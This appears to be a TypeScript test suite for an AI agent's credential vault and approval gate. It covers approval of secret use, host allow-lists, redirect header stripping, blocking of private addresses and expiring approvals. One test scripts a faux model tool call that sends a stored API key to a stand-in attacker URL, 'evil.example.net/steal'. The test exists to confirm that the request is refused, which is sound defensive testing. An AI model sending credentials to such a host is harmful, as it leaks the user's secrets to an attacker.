/**
 * Vault sinks behind the approval gate (issue #56), on real pi-durable turns:
 * item-level approval on top of tool permissions, "for this chat" grants,
 * refusals that never ask, expiring approvals, and the canary invariant —
 * a resolved value never reaches the model or the transcript.
 */
import { Type, type Context as PiContext } from "@earendil-works/pi-ai";
import { defineExtension, defineTool } from "@earendil-works/pi-durable";
import { afterEach, describe, expect, it } from "vite-plus/test";
import { withGatePlan } from "../../../../packages/agent/src/approvals";
import type { Capability } from "../../../../packages/agent/src/capabilities";
import { secretRedactor } from "../../../../packages/agent/src/redact";
import type { AgentRuntime } from "../../../../packages/agent/src/runtime";
import {
  fauxAssistantMessage,
  fauxText,
  fauxToolCall,
  openTestRuntime,
  TEST_MODEL,
} from "../../../../packages/agent/src/testing";
import { createWebToolkit } from "../../../../packages/agent/src/toolkits/web";
import type { ChatEvent, ChatState, ChatToolCall } from "../../../../packages/agent/src/types";
import {
  SecretValue,
  VaultError,
  type VaultApproval,
  type VaultBroker,
  type VaultItemMeta,
  type VaultOutcome,
  type VaultUse,
} from "../../../../packages/agent/src/vault";

const CANARY = "canary-sk-4f9a2c71e3";

function fakeBroker(approval: VaultApproval) {
  const recorded: { use: VaultUse; outcome: VaultOutcome }[] = [];
  const item: VaultItemMeta = {
    handle: "openai",
    kind: "api_key",
    label: "OpenAI",
    origins: [],
    allowedHosts: ["api.example.com"],
    inject: { as: "header", name: "Authorization", format: "Bearer {value}" },
    hasTotp: false,
    approval,
    tools: ["http_request"],
  };
  const planOf = async (use: VaultUse) => {
    if (use.handle !== "openai")
      return { refused: "unknown_handle" as const, message: "No vault item." };
    if (!item.allowedHosts.includes(use.target)) {
      return { refused: "refused_origin" as const, message: `May not be sent to ${use.target}.` };
    }
    return {
      approve: approval === "every_use" || (approval === "per_conversation" && !use.granted),
      grantable: approval !== "every_use",
      unattended: false,
      card: {
        handle: item.handle,
        label: item.label,
        kind: item.kind,
        tool: use.tool,
        target: use.target,
      },
    };
  };
  const broker: VaultBroker = {
    list: async () => [item],
    plan: planOf,
    async use(use, fields, sink) {
      const plan = await planOf(use);
      if (plan.refused) throw new VaultError(plan.refused, plan.message);
      if (plan.approve && !use.approved) throw new VaultError("refused_policy", "Needs approval.");
      const wanted = typeof fields === "function" ? fields(item) : fields;
      const value = new SecretValue(CANARY);
      secretRedactor.register(value);
      recorded.push({ use, outcome: use.approved ? "approved_used" : "used" });
      return sink(Object.fromEntries(wanted.map((f) => [f, value])), item);
    },
    async record(use, outcome) {
      recorded.push({ use, outcome });
    },
    requested: async () => ({}),
  };
  return { broker, recorded };
}

/** A fake API that echoes the auth header it got — the page "leaking" the key. */
function echoFetch(calls: { url: string; auth?: string }[]): typeof fetch {
  return (async (input: string | URL | Request, init?: RequestInit) => {
    const headers = new Headers(init?.headers);
    calls.push({ url: String(input), auth: headers.get("authorization") ?? undefined });
    return new Response(JSON.stringify({ you_sent: headers.get("authorization") }), {
      status: 200,
      headers: { "content-type": "application/json" },
    });
  }) as typeof fetch;
}

function callThenReport(tool: string, args: Record<string, unknown>) {
  return (context: PiContext) => {
    const last = context.messages.at(-1);
    if (last?.role === "toolResult") {
      const text = Array.isArray(last.content)
        ? last.content.map((b) => (b.type === "text" ? b.text : "")).join("")
        : "";
      return fauxAssistantMessage([fauxText(`RESULT:${text}`)]);
    }
    return { ...fauxAssistantMessage([fauxToolCall(tool, args)]), stopReason: "toolUse" as const };
  };
}

function reduce(events: ChatEvent[]): ChatState | undefined {
  let state: ChatState | undefined;
  for (const event of events) {
    if (event.type === "snapshot") state = structuredClone(event.state);
    else if (state && event.type === "upsert") {
      const i = state.messages.findIndex((m) => m.id === event.message.id);
      if (i >= 0) state.messages[i] = event.message;
      else state.messages.push(event.message);
    } else if (state && event.type === "remove") {
      state.messages = state.messages.filter((m) => m.id !== event.id);
    } else if (state && event.type === "busy") state.busy = event.busy;
  }
  return state;
}

async function until<T>(read: () => T | undefined, what: string, ms = 10_000): Promise<T> {
  const deadline = Date.now() + ms;
  for (;;) {
    const value = read();
    if (value !== undefined && value !== false) return value;
    if (Date.now() > deadline) throw new Error(`Timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 20));
  }
}

const lastCall = (events: ChatEvent[], name: string): ChatToolCall | undefined =>
  reduce(events)
    ?.messages.flatMap((m) => m.toolCalls ?? [])
    .findLast((call) => call.name === name);

const results = (events: ChatEvent[]) =>
  reduce(events)
    ?.messages.filter((m) => m.text.startsWith("RESULT:"))
    .map((m) => m.text.slice(7)) ?? [];

const runtimes: AgentRuntime[] = [];
afterEach(async () => {
  await Promise.allSettled(runtimes.splice(0).map((runtime) => runtime.close()));
  secretRedactor.clear();
});

async function openWith(capability: Capability, respondWith: ReturnType<typeof callThenReport>) {
  const runtime = await openTestRuntime({
    storePath: ":memory:",
    capabilities: [capability],
    respondWith,
  });
  runtimes.push(runtime);
  const ref = await runtime.createConversation({
    modelId: TEST_MODEL,
    systemPrompt: "",
    capabilities: { enabled: [capability.id], permissions: {} },
  });
  const events: ChatEvent[] = [];
  await runtime.watchChat(ref, (batch) => events.push(...batch));
  return { runtime, ref, events };
}

const webWith = (broker: VaultBroker, calls: { url: string; auth?: string }[]) =>
  createWebToolkit({
    vault: broker,
    fetch: echoFetch(calls),
    resolveHost: async () => ["93.184.216.34"],
  });

const request = { url: "https://api.example.com/v1/me", auth: "openai" };

describe("vault sinks behind the gate", () => {
  it("asks with the vault card, grants for the chat, and never shows the value", async () => {
    const { broker, recorded } = fakeBroker("per_conversation");
    const calls: { url: string; auth?: string }[] = [];
    const { runtime, ref, events } = await openWith(
      webWith(broker, calls),
      callThenReport("http_request", request),
    );

    await runtime.submit(ref, { requestId: "r1", text: "who am I?" });
    const waiting = await until(
      () =>
        lastCall(events, "http_request")?.status === "awaiting_approval"
          ? lastCall(events, "http_request")
          : undefined,
      "vault approval",
    );
    expect(waiting.vault).toMatchObject({
      handle: "openai",
      target: "api.example.com",
      grantable: true,
    });
    expect(waiting.expiresAt).toBeGreaterThan(Date.now());
    expect(calls).toEqual([]);

    await runtime.decideApproval(ref, waiting.taskId!, "approved", { grant: true });
    await until(() => results(events).length === 1, "first result");
    expect(calls).toEqual([{ url: request.url, auth: `Bearer ${CANARY}` }]);
    // The API echoed the key back; neither the model nor the chat sees it.
    expect(results(events)[0]).toContain("[vault]");
    expect(JSON.stringify(reduce(events))).not.toContain(CANARY);

    // Granted for this chat: the next use runs without a card.
    await runtime.submit(ref, { requestId: "r2", text: "again" });
    await until(() => results(events).length === 2, "second result");
    expect(calls).toHaveLength(2);
    expect(recorded.map((r) => r.outcome)).toEqual(["approved_used", "used"]);
    expect(JSON.stringify(reduce(events))).not.toContain(CANARY);
  }, 20_000);

  it("asks every time for every_use items, even when the tool is allowed", async () => {
    const { broker } = fakeBroker("every_use");
    const calls: { url: string; auth?: string }[] = [];
    const web = webWith(broker, calls);
    const runtime = await openTestRuntime({
      storePath: ":memory:",
      capabilities: [web],
      respondWith: callThenReport("http_request", request),
    });
    runtimes.push(runtime);
    const ref = await runtime.createConversation({
      modelId: TEST_MODEL,
      systemPrompt: "",
      capabilities: { enabled: ["web"], permissions: { http_request: "allow" } },
    });
    const events: ChatEvent[] = [];
    await runtime.watchChat(ref, (batch) => events.push(...batch));
    await runtime.submit(ref, { requestId: "r1", text: "go" });
    const waiting = await until(
      () =>
        lastCall(events, "http_request")?.status === "awaiting_approval"
          ? lastCall(events, "http_request")
          : undefined,
      "vault approval",
    );
    expect(waiting.vault?.grantable).toBe(false);
    await runtime.decideApproval(ref, waiting.taskId!, "denied");
    await until(() => results(events).length === 1, "result");
    expect(results(events)[0]).toMatch(/denied/);
    expect(calls).toEqual([]);
  }, 20_000);

  it("refuses a host the item doesn't allow without asking or resolving", async () => {
    const { broker, recorded } = fakeBroker("allowed");
    const calls: { url: string; auth?: string }[] = [];
    const { runtime, ref, events } = await openWith(
      webWith(broker, calls),
      callThenReport("http_request", { url: "https://evil.example.net/steal", auth: "openai" }),
    );
    await runtime.submit(ref, { requestId: "r1", text: "go" });
    await until(() => results(events).length === 1, "result");
    expect(results(events)[0]).toContain("May not be sent to evil.example.net");
    expect(runtime.pendingApprovals(ref)).toBe(0);
    expect(calls).toEqual([]);
    expect(recorded).toEqual([]);
  }, 20_000);

  it("drops the vault header on a redirect to another host", async () => {
    const { broker } = fakeBroker("allowed");
    const seen: { url: string; auth?: string }[] = [];
    const redirecting = (async (input: string | URL | Request, init?: RequestInit) => {
      const headers = new Headers(init?.headers);
      seen.push({ url: String(input), auth: headers.get("authorization") ?? undefined });
      if (String(input).startsWith("https://api.example.com")) {
        return new Response(null, {
          status: 302,
          headers: { location: "https://other.example.org/x" },
        });
      }
      return new Response("ok", { status: 200 });
    }) as typeof fetch;
    const web = createWebToolkit({
      vault: broker,
      fetch: redirecting,
      resolveHost: async () => ["93.184.216.34"],
    });
    const runtime = await openTestRuntime({
      storePath: ":memory:",
      capabilities: [web],
      respondWith: callThenReport("http_request", request),
    });
    runtimes.push(runtime);
    const ref = await runtime.createConversation({
      modelId: TEST_MODEL,
      systemPrompt: "",
      capabilities: { enabled: ["web"], permissions: { http_request: "allow" } },
    });
    const events: ChatEvent[] = [];
    await runtime.watchChat(ref, (batch) => events.push(...batch));
    await runtime.submit(ref, { requestId: "r1", text: "go" });
    await until(() => results(events).length === 1, "result");
    expect(seen).toEqual([
      { url: request.url, auth: `Bearer ${CANARY}` },
      { url: "https://other.example.org/x", auth: undefined },
    ]);
  }, 20_000);

  it("refuses hosts that resolve to private addresses", async () => {
    const { broker } = fakeBroker("allowed");
    const calls: { url: string; auth?: string }[] = [];
    const web = createWebToolkit({
      vault: broker,
      fetch: echoFetch(calls),
      resolveHost: async () => ["10.0.0.5"],
    });
    const { runtime, ref, events } = await openWith(
      web,
      callThenReport("http_request", { url: "https://internal.example.com/" }),
    );
    await runtime.submit(ref, { requestId: "r1", text: "go" });
    const call = await until(
      () =>
        lastCall(events, "http_request")?.status === "awaiting_approval"
          ? lastCall(events, "http_request")
          : undefined,
      "tool approval",
    );
    await runtime.decideApproval(ref, call.taskId!, "approved");
    await until(() => results(events).length === 1, "result");
    expect(results(events)[0]).toMatch(/Private and local addresses/);
    expect(calls).toEqual([]);
  }, 20_000);
});

describe("expiring approvals", () => {
  function expiringCapability(ran: string[]): Capability {
    const tool = withGatePlan(
      defineTool({
        name: "pay",
        description: "Pay",
        parameters: Type.Object({}),
        execute: async () => {
          ran.push("pay");
          return { output: [{ type: "text", text: "paid" }] };
        },
      }),
      {
        plan: async () => ({ ask: true, details: { vault: { handle: "amex" } }, expiresInMs: 300 }),
      },
    );
    return {
      id: "shop",
      kind: "toolkit",
      name: "Shop",
      description: "Shop",
      extension: defineExtension({ name: "shop", tools: [tool] }),
      tools: [{ name: "pay", label: "Paid", description: "Pay" }],
    };
  }

  it("fails closed when nobody answers in time", async () => {
    const ran: string[] = [];
    const { runtime, ref, events } = await openWith(
      expiringCapability(ran),
      callThenReport("pay", {}),
    );
    await runtime.submit(ref, { requestId: "r1", text: "buy it" });
    await until(() => results(events).length === 1, "expired result", 5_000);
    expect(results(events)[0]).toMatch(/Nobody answered/);
    expect(lastCall(events, "pay")?.status).toBe("expired");
    expect(ran).toEqual([]);
    expect(runtime.pendingApprovals(ref)).toBe(0);
  }, 20_000);
});
